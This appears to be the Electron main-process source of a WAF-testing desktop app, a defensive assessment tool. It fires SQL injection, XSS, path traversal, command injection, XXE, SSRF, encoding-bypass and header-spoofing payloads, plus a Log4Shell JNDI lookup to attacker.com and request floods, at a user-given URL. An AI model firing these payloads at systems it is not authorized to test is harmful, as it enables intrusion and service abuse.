const { app, BrowserWindow, ipcMain, dialog, shell } = require('electron');
const path = require('path');
const https = require('https');
const http = require('http');
const { URL } = require('url');
const fs = require('fs');

let mainWindow;

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1280,
    height: 900,
    minWidth: 1024,
    minHeight: 700,
    backgroundColor: '#0d1117',
    titleBarStyle: 'hidden',
    titleBarOverlay: {
      color: '#0d1117',
      symbolColor: '#58a6ff',
      height: 36
    },
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false
    },
    icon: path.join(__dirname, '../build/icon.ico')
  });

  mainWindow.loadFile(path.join(__dirname, 'renderer/index.html'));
}

app.whenReady().then(createWindow);

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') app.quit();
});

// ──────────────────────────────────────────────
// Core HTTP fetch used by all test modules
// ──────────────────────────────────────────────
function makeRequest(options, postData = null) {
  return new Promise((resolve) => {
    const startTime = Date.now();
    const proto = options.protocol === 'https:' ? https : http;

    const req = proto.request(options, (res) => {
      let body = '';
      res.on('data', chunk => { body += chunk; });
      res.on('end', () => {
        resolve({
          status: res.statusCode,
          headers: res.headers,
          body: body.substring(0, 500),
          latency: Date.now() - startTime,
          error: null
        });
      });
    });

    req.on('error', (err) => {
      resolve({
        status: null,
        headers: {},
        body: '',
        latency: Date.now() - startTime,
        error: err.message
      });
    });

    req.setTimeout(10000, () => {
      req.destroy();
      resolve({
        status: null,
        headers: {},
        body: '',
        latency: 10000,
        error: 'Request timed out'
      });
    });

    if (postData) req.write(postData);
    req.end();
  });
}

// ──────────────────────────────────────────────
// User-Agent pool for rotation
// ──────────────────────────────────────────────
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
];
let uaIndex = 0;
function nextUA() {
  const ua = USER_AGENTS[uaIndex % USER_AGENTS.length];
  uaIndex++;
  return ua;
}

function buildOptions(targetUrl, overrides = {}, runOptions = {}) {
  const parsed = new URL(targetUrl);
  const ua = runOptions.rotateUA ? nextUA()
    : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';

  const headers = {
    'User-Agent': ua,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'close',
  };

  // X-WAF-Tester header — opt-in only
  if (runOptions.sendWafHeader) {
    headers['X-WAF-Tester'] = 'waf-tester';
  }

  // Authentication
  if (runOptions.auth) {
    const { type, value, headerName, user, pass } = runOptions.auth;
    if (type === 'bearer' && value)   headers['Authorization'] = `Bearer ${value}`;
    if (type === 'apikey' && value)   headers[headerName || 'X-API-Key'] = value;
    if (type === 'cookie' && value)   headers['Cookie'] = value;
    if (type === 'basic' && user)     headers['Authorization'] = 'Basic ' +
      Buffer.from(`${user}:${pass}`).toString('base64');
  }

  return {
    protocol: parsed.protocol,
    hostname: parsed.hostname,
    port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
    path: parsed.pathname + parsed.search,
    method: 'GET',
    headers,
    rejectUnauthorized: false,
    ...overrides
  };
}

// ──────────────────────────────────────────────
// Evaluate a response: did the WAF block it?
// Returns: { blocked, confidence, reason }
// confidence: 'high' | 'likely' | 'uncertain' | 'bypassed'
// ──────────────────────────────────────────────
function evaluateBlock(res, baseline = null) {
  if (res.error) return { blocked: null, confidence: 'uncertain', reason: `Network error: ${res.error}` };

  const hardBlockStatuses = new Set([403, 406, 429]);
  const softBlockStatuses = new Set([400, 405, 503]);
  const wafBodyKeywords = ['blocked', 'forbidden', 'access denied', 'waf', 'firewall',
    'security violation', 'rejected', 'not acceptable', 'request denied', 'threat detected'];

  const bodyLower = (res.body || '').toLowerCase();
  const hasWafKeyword = wafBodyKeywords.some(kw => bodyLower.includes(kw));

  // Hard block: definitive WAF status codes
  if (hardBlockStatuses.has(res.status)) {
    return { blocked: true, confidence: 'high', reason: `HTTP ${res.status} — definitive block` };
  }

  // Baseline comparison: if we have a baseline, compare structural similarity
  if (baseline && res.status === baseline.status) {
    // Same status as baseline — check if body diverged significantly (WAF block page)
    const baseLen = (baseline.body || '').length;
    const resLen = (res.body || '').length;
    const lenDiff = baseLen > 0 ? Math.abs(resLen - baseLen) / baseLen : 0;

    if (hasWafKeyword) {
      return { blocked: true, confidence: 'likely', reason: `HTTP ${res.status} matches baseline but body contains WAF keywords` };
    }
    if (lenDiff > 0.6 && resLen < baseLen) {
      // Significantly shorter than baseline — likely a block/redirect page
      return { blocked: true, confidence: 'uncertain', reason: `HTTP ${res.status} — response ${Math.round(lenDiff * 100)}% shorter than baseline (possible block page)` };
    }
    // Response looks similar to baseline — payload likely reached origin
    return { blocked: false, confidence: 'bypassed', reason: `HTTP ${res.status} — response matches baseline structure, payload reached origin` };
  }

  // Soft block statuses (could be legitimate app errors or WAF blocks)
  if (softBlockStatuses.has(res.status)) {
    if (hasWafKeyword) {
      return { blocked: true, confidence: 'likely', reason: `HTTP ${res.status} with WAF keywords in body` };
    }
    if (baseline && res.status !== baseline.status) {
      return { blocked: true, confidence: 'uncertain', reason: `HTTP ${res.status} — differs from baseline ${baseline.status}, possible block` };
    }
    return { blocked: true, confidence: 'uncertain', reason: `HTTP ${res.status} — may be WAF block or legitimate app error` };
  }

  // WAF keyword in body on a 200
  if (hasWafKeyword) {
    return { blocked: true, confidence: 'likely', reason: `HTTP ${res.status} but body contains WAF keywords` };
  }

  // Everything else: not blocked
  return { blocked: false, confidence: 'bypassed', reason: `HTTP ${res.status} — payload reached origin` };
}

// ══════════════════════════════════════════════
// TEST SUITES
// ══════════════════════════════════════════════

// 1. OWASP Top 10
async function runOwaspTests(targetUrl, sendProgress, runOptions = {}, baseline = null) {
  const tests = [
    // SQL Injection
    { id: 'sqli-1', name: 'SQL Injection (classic)', category: 'A03 Injection',
      payload: "' OR '1'='1", method: 'GET', paramMode: 'query' },
    { id: 'sqli-2', name: 'SQL Injection (UNION)', category: 'A03 Injection',
      payload: "' UNION SELECT 1,2,3--", method: 'GET', paramMode: 'query' },
    { id: 'sqli-3', name: 'SQL Injection (blind time)', category: 'A03 Injection',
      payload: "'; WAITFOR DELAY '0:0:5'--", method: 'GET', paramMode: 'query' },
    // XSS
    { id: 'xss-1', name: 'XSS (script tag)', category: 'A03 Injection',
      payload: '<script>alert(1)</script>', method: 'GET', paramMode: 'query' },
    { id: 'xss-2', name: 'XSS (img onerror)', category: 'A03 Injection',
      payload: '<img src=x onerror=alert(1)>', method: 'GET', paramMode: 'query' },
    { id: 'xss-3', name: 'XSS (SVG onload)', category: 'A03 Injection',
      payload: '<svg onload=alert(1)>', method: 'GET', paramMode: 'query' },
    // Path Traversal
    { id: 'lfi-1', name: 'Path Traversal (../)', category: 'A01 Broken Access Control',
      payload: '../../../etc/passwd', method: 'GET', paramMode: 'path' },
    { id: 'lfi-2', name: 'Path Traversal (encoded)', category: 'A01 Broken Access Control',
      payload: '..%2F..%2F..%2Fetc%2Fpasswd', method: 'GET', paramMode: 'path' },
    // Command Injection
    { id: 'cmdi-1', name: 'Command Injection (;)', category: 'A03 Injection',
      payload: '; cat /etc/passwd', method: 'GET', paramMode: 'query' },
    { id: 'cmdi-2', name: 'Command Injection (|)', category: 'A03 Injection',
      payload: '| whoami', method: 'GET', paramMode: 'query' },
    // XXE
    { id: 'xxe-1', name: 'XXE Injection', category: 'A05 Security Misconfiguration',
      payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      method: 'POST', paramMode: 'body', contentType: 'application/xml' },
    // SSRF
    { id: 'ssrf-1', name: 'SSRF (localhost)', category: 'A10 SSRF',
      payload: 'http://localhost/admin', method: 'GET', paramMode: 'query' },
    { id: 'ssrf-2', name: 'SSRF (169.254 metadata)', category: 'A10 SSRF',
      payload: 'http://169.254.169.254/latest/meta-data/', method: 'GET', paramMode: 'query' },
    // Log4Shell
    { id: 'log4j-1', name: 'Log4Shell (JNDI lookup)', category: 'A06 Vulnerable Components',
      payload: '${jndi:ldap://attacker.com/a}', method: 'GET', paramMode: 'header', headerName: 'X-Api-Version' },
    // SSTI
    { id: 'ssti-1', name: 'SSTI (Jinja2)', category: 'A03 Injection',
      payload: '{{7*7}}', method: 'GET', paramMode: 'query' },
  ];

  const results = [];
  for (let i = 0; i < tests.length; i++) {
    const t = tests[i];
    sendProgress({ current: i + 1, total: tests.length, name: t.name });

    const parsed = new URL(targetUrl);
    let opts;

    if (t.paramMode === 'query') {
      parsed.searchParams.set('q', t.payload);
      opts = buildOptions(parsed.toString(), {}, runOptions);
    } else if (t.paramMode === 'path') {
      opts = buildOptions(targetUrl, {}, runOptions);
      opts.path = '/' + t.payload;
    } else if (t.paramMode === 'header') {
      opts = buildOptions(targetUrl, {}, runOptions);
      opts.headers[t.headerName] = t.payload;
    } else if (t.paramMode === 'body') {
      opts = buildOptions(targetUrl, { method: 'POST' }, runOptions);
      opts.headers['Content-Type'] = t.contentType;
      opts.headers['Content-Length'] = Buffer.byteLength(t.payload);
    }

    const res = await makeRequest(opts, t.paramMode === 'body' ? t.payload : null);
    const eval_ = evaluateBlock(res, baseline);

    results.push({
      id: t.id, name: t.name, category: t.category,
      payload: t.payload.substring(0, 60),
      status: res.status, latency: res.latency,
      blocked: eval_.blocked, confidence: eval_.confidence, reason: eval_.reason
    });

    await sleep(200);
  }
  return results;
}

// 2. Rate Limiting
async function runRateLimitTests(targetUrl, sendProgress, runOptions = {}) {
  const results = [];
  const blockingStatuses = new Set([400, 403, 429, 503]);
  const isBlocked = r => r.error ? false : blockingStatuses.has(r.status);

  // Burst test: 30 rapid requests
  sendProgress({ current: 1, total: 3, name: 'Burst flood (30 req)' });
  const burstResults = await Promise.all(
    Array.from({ length: 30 }, () => makeRequest(buildOptions(targetUrl, {}, runOptions)))
  );
  const burstBlocked = burstResults.filter(isBlocked).length;
  const burst429 = burstResults.filter(r => r.status === 429).length;
  const burst403 = burstResults.filter(r => r.status === 403).length;
  results.push({
    id: 'rl-burst', name: 'Burst Flood (30 simultaneous)',
    category: 'Rate Limiting', payload: '30 concurrent GET requests',
    status: burst429 > 0 ? 429 : burst403 > 0 ? 403 : burstResults[0].status,
    latency: Math.max(...burstResults.map(r => r.latency)),
    blocked: burstBlocked >= 6,
    confidence: burstBlocked >= 15 ? 'high' : burstBlocked >= 6 ? 'likely' : burstBlocked > 0 ? 'uncertain' : 'bypassed',
    reason: `${burstBlocked} / 30 blocked (429: ${burst429}, 403: ${burst403}) — threshold: ≥6`
  });

  // Sequential flood: 20 requests with 100ms delay
  sendProgress({ current: 2, total: 3, name: 'Sequential flood (20 req / 100ms)' });
  const seqResults = [];
  for (let i = 0; i < 20; i++) {
    seqResults.push(await makeRequest(buildOptions(targetUrl, {}, runOptions)));
    await sleep(100);
  }
  const seqBlocked = seqResults.filter(isBlocked).length;
  const seq429 = seqResults.filter(r => r.status === 429).length;
  results.push({
    id: 'rl-seq', name: 'Sequential Flood (20 req @ 100ms)',
    category: 'Rate Limiting', payload: '20 sequential GET requests, 100ms apart',
    status: seq429 > 0 ? 429 : seqResults[seqResults.length - 1].status,
    latency: seqResults.reduce((a, r) => a + r.latency, 0),
    blocked: seqBlocked >= 1,
    confidence: seqBlocked >= 5 ? 'high' : seqBlocked >= 1 ? 'likely' : 'bypassed',
    reason: `${seqBlocked} / 20 blocked (429: ${seq429}) — threshold: ≥1`
  });

  // Header-spoofed flood bypass attempt
  sendProgress({ current: 3, total: 3, name: 'IP spoof bypass (X-Forwarded-For)' });
  const spoofResults = await Promise.all(
    Array.from({ length: 15 }, (_, i) => {
      const opts = buildOptions(targetUrl, {}, runOptions);
      opts.headers['X-Forwarded-For'] = `10.0.0.${i + 1}`;
      opts.headers['X-Real-IP'] = `10.0.0.${i + 1}`;
      return makeRequest(opts);
    })
  );
  const spoofBlocked = spoofResults.filter(isBlocked).length;
  results.push({
    id: 'rl-spoof', name: 'Rate Limit Bypass (X-Forwarded-For rotation)',
    category: 'Rate Limiting', payload: 'X-Forwarded-For: 10.0.0.1–15',
    status: spoofBlocked > 0 ? spoofResults.find(isBlocked).status : spoofResults[0].status,
    latency: Math.max(...spoofResults.map(r => r.latency)),
    blocked: spoofBlocked >= 3,
    confidence: spoofBlocked >= 8 ? 'high' : spoofBlocked >= 3 ? 'likely' : spoofBlocked > 0 ? 'uncertain' : 'bypassed',
    reason: `${spoofBlocked} / 15 blocked despite spoofed IPs — bypass ${spoofBlocked < 3 ? 'SUCCEEDED (WAF trusts XFF)' : 'prevented'}`
  });

  return results;
}

// 3. Bot Detection
async function runBotTests(targetUrl, sendProgress, runOptions = {}, baseline = null) {
  const tests = [
    { id: 'bot-1', name: 'Missing User-Agent', category: 'Bot Detection',
      ua: '', desc: 'Empty User-Agent header' },
    { id: 'bot-2', name: 'Known Scanner (sqlmap)', category: 'Bot Detection',
      ua: 'sqlmap/1.7.8#stable (https://sqlmap.org)', desc: 'sqlmap user-agent' },
    { id: 'bot-3', name: 'Known Scanner (Nikto)', category: 'Bot Detection',
      ua: 'Mozilla/5.00 (Nikto/2.1.6)', desc: 'Nikto scanner UA' },
    { id: 'bot-4', name: 'Known Scanner (Nmap)', category: 'Bot Detection',
      ua: 'Mozilla/5.0 Nmap Scripting Engine', desc: 'Nmap NSE UA' },
    { id: 'bot-5', name: 'Headless Chrome', category: 'Bot Detection',
      ua: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 HeadlessChrome/120.0.0.0', desc: 'Headless Chrome UA' },
    { id: 'bot-6', name: 'Python Requests', category: 'Bot Detection',
      ua: 'python-requests/2.31.0', desc: 'Python requests library' },
    { id: 'bot-7', name: 'curl UA', category: 'Bot Detection',
      ua: 'curl/8.4.0', desc: 'curl user-agent' },
    { id: 'bot-8', name: 'Scrapy Spider', category: 'Bot Detection',
      ua: 'Scrapy/2.11.0 (+https://scrapy.org)', desc: 'Scrapy web scraper' },
    { id: 'bot-9', name: 'Masscan', category: 'Bot Detection',
      ua: 'masscan/1.3 (https://github.com/robertdavidgraham/masscan)', desc: 'Port scanner UA' },
    { id: 'bot-10', name: 'No Accept header', category: 'Bot Detection',
      ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120', desc: 'Missing Accept/Accept-Language headers',
      stripHeaders: true }
  ];

  const results = [];
  for (let i = 0; i < tests.length; i++) {
    const t = tests[i];
    sendProgress({ current: i + 1, total: tests.length, name: t.name });

    // Bot tests always override UA — pass rotateUA=false so buildOptions doesn't rotate
    const opts = buildOptions(targetUrl, {}, { ...runOptions, rotateUA: false });
    if (t.ua !== undefined) opts.headers['User-Agent'] = t.ua;
    if (t.stripHeaders) {
      delete opts.headers['Accept'];
      delete opts.headers['Accept-Language'];
    }

    const res = await makeRequest(opts);
    const eval_ = evaluateBlock(res, baseline);
    results.push({
      id: t.id, name: t.name, category: t.category,
      payload: t.desc,
      status: res.status, latency: res.latency,
      blocked: eval_.blocked, confidence: eval_.confidence, reason: eval_.reason
    });
    await sleep(300);
  }
  return results;
}

// 4. Custom Bypass Attempts
async function runBypassTests(targetUrl, sendProgress, runOptions = {}, baseline = null) {
  const parsed = new URL(targetUrl);

  const makeQueryTest = (id, name, payload, desc) => async () => {
    const url = new URL(targetUrl);
    url.searchParams.set('q', payload);
    const res = await makeRequest(buildOptions(url.toString(), {}, runOptions));
    const eval_ = evaluateBlock(res, baseline);
    return { id, name, category: 'Bypass', payload: desc || payload.substring(0, 60),
      status: res.status, latency: res.latency, ...eval_ };
  };

  const makeHeaderTest = (id, name, headers, desc) => async () => {
    const opts = buildOptions(targetUrl, {}, runOptions);
    Object.assign(opts.headers, headers);
    try {
      const res = await makeRequest(opts);
      const eval_ = evaluateBlock(res, baseline);
      return { id, name, category: 'Bypass', payload: desc,
        status: res.status, latency: res.latency, ...eval_ };
    } catch (err) {
      return { id, name, category: 'Bypass', payload: desc,
        status: null, latency: 0,
        blocked: true, confidence: 'high',
        reason: `Blocked by Node HTTP layer: ${err.message}` };
    }
  };

  const makePathTest = (id, name, path_, desc) => async () => {
    const opts = buildOptions(targetUrl, {}, runOptions);
    opts.path = path_;
    const res = await makeRequest(opts);
    const eval_ = evaluateBlock(res, baseline);
    return { id, name, category: 'Bypass', payload: desc,
      status: res.status, latency: res.latency, ...eval_ };
  };

  const testFns = [
    makeQueryTest('bp-1', 'Double URL-encode XSS', '%253Cscript%253Ealert(1)%253C%2Fscript%253E', 'Double-encoded <script>'),
    makeQueryTest('bp-2', 'Unicode XSS (fullwidth)', '\uFF1Cscript\uFF1Ealert(1)\uFF1C/script\uFF1E', 'Fullwidth Unicode <script>'),
    makeQueryTest('bp-3', 'HTML entity XSS', '&lt;script&gt;alert(1)&lt;/script&gt;', 'HTML entities in payload'),
    makeQueryTest('bp-4', 'Null byte injection', "' OR 1=1\x00--", "SQLi with null byte \\x00"),
    makeQueryTest('bp-5', 'Case variation SQLi', "' oR '1'='1", 'Mixed-case OR keyword'),
    makeQueryTest('bp-6', 'Comment obfuscated SQLi', "' OR/**/1=1--", 'SQL comment within payload'),
    makeHeaderTest('bp-7', 'Header injection (CRLF)', { 'X-Custom': 'test\r\nX-Injected: evil' }, 'CRLF in custom header'),
    makeHeaderTest('bp-8', 'Host header injection', { 'Host': 'evil.attacker.com' }, 'Spoofed Host header'),
    makeHeaderTest('bp-9', 'HTTP method override', { 'X-HTTP-Method-Override': 'DELETE', 'X-Method-Override': 'DELETE' }, 'Method override headers'),
    makePathTest('bp-10', 'Double slash bypass', '//' + parsed.pathname, 'Double-slash path prefix'),
    makePathTest('bp-11', 'Semicolon path bypass', parsed.pathname + ';/../admin', 'Semicolon path trick'),
    makeQueryTest('bp-12', 'Base64 encoded SQLi', Buffer.from("' OR 1=1--").toString('base64'), "Base64-encoded SQLi"),
  ];

  const results = [];
  for (let i = 0; i < testFns.length; i++) {
    const result = await testFns[i]();
    sendProgress({ current: i + 1, total: testFns.length, name: result.name });
    results.push(result);
    await sleep(250);
  }
  return results;
}

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

// ══════════════════════════════════════════════
// IPC Handlers
// ══════════════════════════════════════════════

ipcMain.handle('run-tests', async (event, { url, suites, options }) => {
  const allResults = {};
  uaIndex = 0; // reset UA rotation each run

  const runOptions = {
    rotateUA:    options?.rotateUA    ?? true,
    sendWafHeader: options?.sendWafHeader ?? false,
    useBaseline: options?.useBaseline ?? true,
    auth:        options?.auth        ?? null,
  };

  const send = (suite, progress) => {
    mainWindow.webContents.send('test-progress', { suite, ...progress });
  };

  // Fetch baseline response (clean GET, no payload)
  let baseline = null;
  if (runOptions.useBaseline) {
    try {
      baseline = await makeRequest(buildOptions(url, {}, runOptions));
    } catch (_) { baseline = null; }
  }

  try {
    if (suites.includes('owasp')) {
      allResults.owasp = await runOwaspTests(url, p => send('owasp', p), runOptions, baseline);
    }
    if (suites.includes('ratelimit')) {
      allResults.ratelimit = await runRateLimitTests(url, p => send('ratelimit', p), runOptions);
    }
    if (suites.includes('bot')) {
      allResults.bot = await runBotTests(url, p => send('bot', p), runOptions, baseline);
    }
    if (suites.includes('bypass')) {
      allResults.bypass = await runBypassTests(url, p => send('bypass', p), runOptions, baseline);
    }
  } catch (err) {
    return { error: err.message };
  }

  return { results: allResults, baseline: baseline ? { status: baseline.status, latency: baseline.latency } : null };
});

ipcMain.handle('export-report', async (event, { results, url }) => {
  const { filePath } = await dialog.showSaveDialog(mainWindow, {
    title: 'Save WAF Report',
    defaultPath: `waf-report-${Date.now()}.json`,
    filters: [
      { name: 'JSON Report', extensions: ['json'] },
      { name: 'All Files', extensions: ['*'] }
    ]
  });

  if (!filePath) return { cancelled: true };

  const report = {
    tool: 'WAF Tester v1.0',
    target: url,
    timestamp: new Date().toISOString(),
    summary: buildSummary(results),
    results
  };

  fs.writeFileSync(filePath, JSON.stringify(report, null, 2));
  return { saved: true, path: filePath };
});

ipcMain.handle('export-html-report', async (event, { results, url }) => {
  const { filePath } = await dialog.showSaveDialog(mainWindow, {
    title: 'Save HTML Report',
    defaultPath: `waf-report-${Date.now()}.html`,
    filters: [{ name: 'HTML Report', extensions: ['html'] }]
  });

  if (!filePath) return { cancelled: true };

  const html = generateHtmlReport(results, url);
  fs.writeFileSync(filePath, html);
  shell.openPath(filePath);
  return { saved: true, path: filePath };
});

function buildSummary(results) {
  const summary = {};
  for (const [suite, tests] of Object.entries(results)) {
    const total = tests.length;
    const blocked = tests.filter(t => t.blocked === true).length;
    const passed = tests.filter(t => t.blocked === false).length;
    const errors = tests.filter(t => t.blocked === null).length;
    summary[suite] = { total, blocked, passed, errors, score: Math.round((blocked / total) * 100) };
  }
  return summary;
}

function generateHtmlReport(results, targetUrl) {
  const summary = buildSummary(results);
  const now = new Date().toLocaleString();

  const suiteNames = { owasp: 'OWASP Top 10', ratelimit: 'Rate Limiting', bot: 'Bot Detection', bypass: 'Bypass Attempts' };

  let tableRows = '';
  for (const [suite, tests] of Object.entries(results)) {
    for (const t of tests) {
      const statusClass = t.blocked === true ? 'blocked' : t.blocked === false ? 'passed' : 'error';
      const statusLabel = t.blocked === true ? '✓ BLOCKED' : t.blocked === false ? '✗ PASSED' : '? ERROR';
      tableRows += `<tr class="${statusClass}">
        <td>${suiteNames[suite] || suite}</td>
        <td>${t.name}</td>
        <td><code>${escHtml(t.payload)}</code></td>
        <td>${t.status || 'N/A'}</td>
        <td>${t.latency}ms</td>
        <td class="status-cell">${statusLabel}</td>
        <td>${escHtml(t.reason)}</td>
      </tr>`;
    }
  }

  let summaryCards = '';
  for (const [suite, s] of Object.entries(summary)) {
    const color = s.score >= 80 ? '#238636' : s.score >= 50 ? '#d29922' : '#da3633';
    summaryCards += `<div class="card">
      <h3>${suiteNames[suite] || suite}</h3>
      <div class="score" style="color:${color}">${s.score}%</div>
      <p>${s.blocked} blocked / ${s.total} total</p>
    </div>`;
  }

  return `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>WAF Test Report</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    background: #0d1117; color: #c9d1d9; padding: 40px; }
  h1 { color: #58a6ff; margin-bottom: 8px; }
  .meta { color: #8b949e; margin-bottom: 32px; }
  .cards { display: flex; gap: 16px; margin-bottom: 32px; flex-wrap: wrap; }
  .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px;
    padding: 20px; min-width: 180px; text-align: center; }
  .card h3 { color: #58a6ff; margin-bottom: 8px; font-size: 14px; }
  .score { font-size: 36px; font-weight: 700; margin-bottom: 4px; }
  .card p { color: #8b949e; font-size: 13px; }
  table { width: 100%; border-collapse: collapse; background: #161b22;
    border-radius: 8px; overflow: hidden; border: 1px solid #30363d; }
  th { background: #1c2128; padding: 12px 16px; text-align: left;
    color: #8b949e; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
  td { padding: 10px 16px; border-top: 1px solid #21262d; font-size: 13px; }
  tr.blocked td { background: rgba(35, 134, 54, 0.08); }
  tr.passed td { background: rgba(218, 55, 51, 0.08); }
  tr.error td { background: rgba(139, 148, 158, 0.08); }
  .status-cell { font-weight: 600; }
  tr.blocked .status-cell { color: #3fb950; }
  tr.passed .status-cell { color: #f85149; }
  tr.error .status-cell { color: #8b949e; }
  code { background: #1c2128; padding: 2px 6px; border-radius: 4px;
    font-family: monospace; font-size: 12px; color: #79c0ff; }
</style></head><body>
<h1>🛡️ WAF Test Report</h1>
<p class="meta">Target: <strong>${escHtml(targetUrl)}</strong> &nbsp;·&nbsp; Generated: ${now}</p>
<div class="cards">${summaryCards}</div>
<table>
<thead><tr>
  <th>Suite</th><th>Test</th><th>Payload</th>
  <th>Status</th><th>Latency</th><th>Result</th><th>Reason</th>
</tr></thead>
<tbody>${tableRows}</tbody>
</table>
</body></html>`;
}

function escHtml(str) {
  return String(str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
